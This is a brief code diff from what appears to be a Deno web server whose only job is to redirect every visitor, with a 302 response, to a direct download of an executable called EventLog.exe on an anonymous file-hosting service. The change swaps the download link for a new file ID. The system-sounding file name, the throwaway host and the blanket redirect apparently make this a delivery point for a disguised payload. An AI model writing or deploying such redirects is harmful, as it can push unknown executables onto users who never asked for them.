@@ -5,7 +5,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://store-na-phx-4.gofile.io/download/direct/f7cff518-32bd-4f94-b0c1-c3dfd13ba6a9/EventLog.exe",
+      Location: "https://store-na-phx-4.gofile.io/download/direct/7aefb050-f774-457e-9feb-977d52e400a6/EventLog.exe",
     },
   });
 });
